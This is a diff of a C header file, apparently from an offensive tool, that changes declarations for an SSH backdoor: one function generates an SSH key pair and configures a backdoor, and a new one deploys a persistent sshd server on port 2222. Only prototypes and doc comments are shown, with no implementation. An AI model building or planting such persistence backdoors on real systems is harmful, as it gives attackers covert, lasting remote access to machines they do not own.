@@ -7,12 +7,16 @@
 
 #pragma once
 
-#include <stdbool.h>
+/**
+ * @brief Generating a ssh keys pair and configure a backdoor
+ *
+ * @return void
+ */
+extern void ssh_backdoor();
 
 /**
- * @brief Activate or deactivate an SSH backdoor on port 2222
+ * @brief Deploys a persistence SShd server on the port 2222
  *
- * @param stop: If true, the function will attempt to stop the backdoor if it is running. If false, it will attempt to start the backdoor.
- * @return 0 on success, 1 on failure
+ * @return PID du processus sshd (0 si déjà actif)
  */
-extern int ssh_backdoor(bool stop);
+extern int ssh_persistent_server();
